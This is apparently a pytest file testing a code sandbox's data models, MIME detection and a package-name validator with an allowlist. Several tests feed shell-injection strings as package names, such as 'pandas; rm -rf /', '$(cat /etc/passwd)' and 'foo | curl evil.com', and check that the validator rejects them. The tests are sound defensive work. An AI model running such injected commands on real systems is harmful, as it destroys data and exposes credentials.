"""Tests for app.sandbox.models."""

import pytest

from app.sandbox.models import (
    ArtifactOutput,
    ExecutionResult,
    SandboxLanguage,
    SandboxMode,
    detect_mime_type,
    EXTENSION_TO_MIME,
    DEFAULT_TIMEOUT_SECONDS,
    DEFAULT_MEMORY_LIMIT_MB,
    DEFAULT_CPU_LIMIT,
    SANDBOX_IMAGE,
)


class TestSandboxLanguage:
    def test_values(self):
        assert SandboxLanguage.PYTHON == "python"
        assert SandboxLanguage.TYPESCRIPT == "typescript"
        assert SandboxLanguage.SQLITE == "sqlite"
        assert SandboxLanguage.POSTGRESQL == "postgresql"

    def test_all_members(self):
        assert len(SandboxLanguage) == 4


class TestSandboxMode:
    def test_values(self):
        assert SandboxMode.LOCAL == "local"
        assert SandboxMode.DOCKER == "docker"


class TestArtifactOutput:
    def test_construction(self):
        a = ArtifactOutput(
            file_name="chart.png",
            file_path="/tmp/out/chart.png",
            mime_type="image/png",
            size_bytes=4096,
        )
        assert a.file_name == "chart.png"
        assert a.file_path == "/tmp/out/chart.png"
        assert a.mime_type == "image/png"
        assert a.size_bytes == 4096


class TestExecutionResult:
    def test_defaults(self):
        r = ExecutionResult(success=True)
        assert r.success is True
        assert r.stdout == ""
        assert r.stderr == ""
        assert r.exit_code == -1
        assert r.execution_time_ms == 0
        assert r.artifacts == []
        assert r.error is None

    def test_with_artifacts(self):
        art = ArtifactOutput(
            file_name="out.csv",
            file_path="/tmp/out.csv",
            mime_type="text/csv",
            size_bytes=128,
        )
        r = ExecutionResult(
            success=True,
            stdout="done",
            exit_code=0,
            execution_time_ms=500,
            artifacts=[art],
        )
        assert len(r.artifacts) == 1
        assert r.artifacts[0].file_name == "out.csv"

    def test_failure(self):
        r = ExecutionResult(
            success=False,
            stderr="Traceback ...",
            exit_code=1,
            error="Script failed",
        )
        assert r.success is False
        assert r.error == "Script failed"


class TestDetectMimeType:
    @pytest.mark.parametrize("filename,expected", [
        ("chart.png", "image/png"),
        ("photo.jpg", "image/jpeg"),
        ("photo.jpeg", "image/jpeg"),
        ("anim.gif", "image/gif"),
        ("diagram.svg", "image/svg+xml"),
        ("report.pdf", "application/pdf"),
        ("data.csv", "text/csv"),
        ("config.json", "application/json"),
        ("page.html", "text/html"),
        ("readme.txt", "text/plain"),
        ("notes.md", "text/markdown"),
        ("doc.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
        ("sheet.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"),
        ("slides.pptx", "application/vnd.openxmlformats-officedocument.presentationml.presentation"),
    ])
    def test_known_extensions(self, filename, expected):
        assert detect_mime_type(filename) == expected

    def test_unknown_extension(self):
        assert detect_mime_type("data.xyz") == "application/octet-stream"

    def test_no_extension(self):
        assert detect_mime_type("Makefile") == "application/octet-stream"

    def test_case_insensitive(self):
        assert detect_mime_type("Chart.PNG") == "image/png"
        assert detect_mime_type("report.PDF") == "application/pdf"


class TestConstants:
    def test_default_timeout(self):
        assert DEFAULT_TIMEOUT_SECONDS == 60

    def test_default_memory(self):
        assert DEFAULT_MEMORY_LIMIT_MB == 512

    def test_default_cpu(self):
        assert DEFAULT_CPU_LIMIT == 0.5

    def test_sandbox_image(self):
        assert SANDBOX_IMAGE == "pipeshub/sandbox:latest"


class TestValidatePackages:
    """Tests for the validate_packages security function."""

    def test_none_returns_empty(self):
        from app.sandbox.models import validate_packages
        assert validate_packages(None) == []

    def test_empty_list(self):
        from app.sandbox.models import validate_packages
        assert validate_packages([]) == []

    def test_valid_pypi_packages(self):
        from app.sandbox.models import validate_packages
        assert validate_packages(["pandas", "numpy", "matplotlib"]) == ["pandas", "numpy", "matplotlib"]

    def test_valid_npm_scoped_package(self):
        from app.sandbox.models import validate_packages
        assert validate_packages(["@types/node"]) == ["@types/node"]

    def test_valid_package_with_version(self):
        from app.sandbox.models import validate_packages
        assert validate_packages(["pandas>=1.5.0"]) == ["pandas>=1.5.0"]

    def test_valid_package_with_dots(self):
        from app.sandbox.models import validate_packages
        assert validate_packages(["python-docx"]) == ["python-docx"]

    def test_rejects_semicolon_injection(self):
        from app.sandbox.models import validate_packages
        with pytest.raises(ValueError, match="Invalid package name"):
            validate_packages(["pandas; rm -rf /"])

    def test_rejects_backtick_injection(self):
        from app.sandbox.models import validate_packages
        with pytest.raises(ValueError, match="Invalid package name"):
            validate_packages(["`whoami`"])

    def test_rejects_dollar_injection(self):
        from app.sandbox.models import validate_packages
        with pytest.raises(ValueError, match="Invalid package name"):
            validate_packages(["$(cat /etc/passwd)"])

    def test_rejects_pipe_injection(self):
        from app.sandbox.models import validate_packages
        with pytest.raises(ValueError, match="Invalid package name"):
            validate_packages(["foo | curl evil.com"])

    def test_rejects_ampersand_injection(self):
        from app.sandbox.models import validate_packages
        with pytest.raises(ValueError, match="Invalid package name"):
            validate_packages(["foo && evil"])

    def test_rejects_newline_injection(self):
        from app.sandbox.models import validate_packages
        with pytest.raises(ValueError, match="Invalid package name"):
            validate_packages(["foo\nrm -rf /"])

    def test_strips_whitespace(self):
        from app.sandbox.models import validate_packages
        assert validate_packages(["  pandas  ", "numpy"]) == ["pandas", "numpy"]

    def test_skips_empty_strings(self):
        from app.sandbox.models import validate_packages
        assert validate_packages(["", "pandas", "  "]) == ["pandas"]


class TestValidatePackagesAllowlist:
    """Tests for the allowlist layer of validate_packages (language= kwarg)."""

    def test_language_none_does_not_enforce_allowlist(self):
        """Legacy callers omitting language= get only the shell-injection check."""
        from app.sandbox.models import validate_packages
        # 'malicious-unknown-thing' is obviously NOT on any allowlist but also
        # passes the injection regex, so without language= it should succeed.
        result = validate_packages(["malicious-unknown-thing"])
        assert result == ["malicious-unknown-thing"]

    def test_python_language_enforces_allowlist(self):
        from app.sandbox.models import validate_packages
        from app.sandbox.package_policy import PackageNotAllowedError
        with pytest.raises(PackageNotAllowedError):
            validate_packages(["malicious-unknown-thing"], language=SandboxLanguage.PYTHON)

    def test_python_allowed_package(self):
        from app.sandbox.models import validate_packages
        assert validate_packages(["pandas"], language=SandboxLanguage.PYTHON) == ["pandas"]

    def test_typescript_language_enforces_allowlist(self):
        from app.sandbox.models import validate_packages
        from app.sandbox.package_policy import PackageNotAllowedError
        with pytest.raises(PackageNotAllowedError):
            validate_packages(["axios"], language=SandboxLanguage.TYPESCRIPT)

    def test_typescript_allowed_package(self):
        from app.sandbox.models import validate_packages
        assert validate_packages(
            ["chart.js"], language=SandboxLanguage.TYPESCRIPT,
        ) == ["chart.js"]

    def test_shell_injection_check_runs_before_allowlist(self):
        """Shell-metacharacter check should fire first and raise plain ValueError."""
        from app.sandbox.models import validate_packages
        from app.sandbox.package_policy import PackageNotAllowedError
        # "pandas; rm -rf /" would be on the allowlist if we stripped the tail,
        # but the shell-injection guard must reject it up-front.
        with pytest.raises(ValueError, match="Invalid package name") as exc_info:
            validate_packages(["pandas; rm -rf /"], language=SandboxLanguage.PYTHON)
        assert not isinstance(exc_info.value, PackageNotAllowedError)

    def test_rejected_package_is_subclass_of_value_error(self):
        """PackageNotAllowedError must inherit from ValueError for BC."""
        from app.sandbox.models import validate_packages
        with pytest.raises(ValueError):
            validate_packages(["not-allowed-xyz"], language=SandboxLanguage.PYTHON)

    def test_empty_with_language_returns_empty(self):
        from app.sandbox.models import validate_packages
        assert validate_packages([], language=SandboxLanguage.PYTHON) == []
        assert validate_packages(None, language=SandboxLanguage.PYTHON) == []

    def test_env_extension_applies_through_validate_packages(self, monkeypatch):
        from app.sandbox.models import validate_packages
        monkeypatch.setenv("SANDBOX_EXTRA_ALLOWED_PY_PACKAGES", "my-private-lib")
        assert validate_packages(
            ["my-private-lib"], language=SandboxLanguage.PYTHON,
        ) == ["my-private-lib"]
